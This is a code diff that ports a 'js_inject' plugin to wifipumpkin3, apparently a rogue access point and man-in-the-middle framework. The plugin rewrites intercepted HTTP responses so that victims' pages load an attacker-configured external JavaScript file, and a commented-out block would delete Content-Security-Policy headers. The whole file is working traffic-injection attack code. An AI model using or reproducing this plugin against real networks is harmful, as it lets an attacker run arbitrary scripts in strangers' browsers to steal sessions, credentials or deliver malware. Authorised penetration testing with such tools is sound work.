@@ -1,7 +1,6 @@
-from core.common.platforms import decoded
-from plugins.extension.plugin import PluginTemplate
-
-
+from wifipumpkin3.plugins.extension.base import BasePumpkin
+from os import path
+from bs4 import BeautifulSoup
 
 
 
@@ -26,35 +25,34 @@ Copyright:
     along with this program.  If not, see <http://www.gnu.org/licenses/>
 """
 
-class js_inject(PluginTemplate):
+class js_inject(BasePumpkin):
     meta = {
-        'Name'      : 'js_inject',
-        'Version'   : '1.1',
-        'Description' : 'url injection insert and use our own JavaScript code in a page.',
-        'Author'    : 'by Maintainer'
+        '_name'      : 'js_inject',
+        '_version'   : '1.1',
+        '_description' : 'url injection insert and use our own JavaScript code in a page.',
+        '_author'    : 'by Maintainer'
     }
     def __init__(self):
         for key,value in self.meta.items():
             self.__dict__[key] = value
         self.ConfigParser = True
-        self.url = self.config.get('set_js_inject','url')
+        self.url = self._config.get('set_js_inject','url')
 
-    def request(self, flow):
-        pass
+    def handleResponse(self,request, data):
 
-    def response(self,flow):
-        with decoded(flow.response):  # Remove content encoding (gzip, ...)
-            html = BeautifulSoup(flow.response.content,'lxml')
-            """
-            # To Allow CORS
-            if "Content-Security-Policy" in flow.response.headers:
-                del flow.response.headers["Content-Security-Policy"]
-            """
-            if html.body:
-                url =  '{}'.format(flow.request.pretty_host)
-                metatag = html.new_tag('script')
-                metatag.attrs['src'] = self.url
-                metatag.attrs['type'] = 'text/javascript'
-                html.body.append(metatag)
-                flow.response.content = str(html)
-                self.send_output.emit("[{} js script Injected in [ {} ]".format(self.Name,url))
+
+        html = BeautifulSoup(data,'lxml')
+        """
+        # To Allow CORS
+        if "Content-Security-Policy" in flow.response.headers:
+            del flow.response.headers["Content-Security-Policy"]
+        """
+        if html.body:
+            url =  '{}'.format(request.uri)
+            metatag = html.new_tag('script')
+            metatag.attrs['src'] = self.url
+            metatag.attrs['type'] = 'text/javascript'
+            html.body.append(metatag)
+            data = str(html)
+            print("[{} js script Injected in [ {} ]".format(self._name,url))
+        return data
